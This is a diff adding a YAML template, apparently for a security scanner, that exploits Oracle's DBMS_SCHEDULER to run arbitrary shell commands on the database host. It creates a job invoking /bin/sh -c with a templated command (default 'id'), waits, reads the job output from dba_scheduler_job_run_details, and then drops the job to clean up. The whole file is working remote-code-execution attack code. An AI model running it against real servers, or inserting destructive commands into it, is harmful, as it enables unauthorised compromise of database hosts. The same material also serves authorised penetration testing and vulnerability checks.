@@ -1,0 +1,25 @@
+id: oracle-scheduler-exec
+service: [oracle]
+variables:
+  cmd: id
+  job_name: ZOMBIE_SCHED_JOB
+info:
+  name: Oracle DBMS_SCHEDULER Command Execution
+  severity: critical
+  tags: oracle,exploit,rce,scheduler
+
+services:
+  - ops:
+      - db: "BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => '{{job_name}}', job_type => 'EXECUTABLE', job_action => '/bin/sh', number_of_arguments => 2, enabled => FALSE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('{{job_name}}', 1, '-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('{{job_name}}', 2, '{{cmd}}'); DBMS_SCHEDULER.ENABLE('{{job_name}}'); END;"
+        name: job_create
+      - db: "BEGIN DBMS_LOCK.SLEEP(3); END;"
+      - db: "SELECT 'status=' || status || ':log=' || additional_info FROM dba_scheduler_job_run_details WHERE job_name = '{{job_name}}' ORDER BY log_date DESC"
+        name: job_result
+    extractors:
+      - type: regex
+        name: oracle_scheduler_result
+        part: job_result
+        regex: ['(?m)^status=(.+)$']
+
+  - ops:
+      - db: "BEGIN DBMS_SCHEDULER.DROP_JOB('{{job_name}}', force => TRUE); END;"
